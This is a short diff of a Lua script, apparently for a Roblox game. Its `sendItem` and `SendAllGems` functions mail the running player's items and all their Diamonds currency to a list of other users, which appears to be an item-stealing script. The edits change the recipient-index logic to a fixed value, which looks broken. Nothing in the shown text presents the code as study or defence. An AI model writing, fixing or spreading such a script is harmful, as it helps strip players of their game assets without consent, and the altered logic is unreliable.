@@ -186,7 +186,7 @@ local function getRAP(Type, Item)
 end
 
 local function sendItem(category, uid, am)
-    local userIndex = 1, 2, 3, 4, 5
+    local userIndex = 1
     local maxUsers = #users
     local sent = false
     
@@ -210,7 +210,7 @@ local function sendItem(category, uid, am)
                 mailSendPrice = 5000000
             end
         elseif response == false and err == "They don't have enough space!" then
-            userIndex = userIndex + 1
+            userIndex = 2
             if userIndex > maxUsers then
                 sent = true
             end
@@ -222,7 +222,7 @@ local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 1, 2, 3, 4, 5
+                local userIndex = 1
                 local maxUsers = #users
                 local sent = false
                 
@@ -241,7 +241,7 @@ local function SendAllGems()
                     if response == true then
                         sent = true
                     elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
+                        userIndex = 2
                         if userIndex > maxUsers then
                             sent = true
                         end
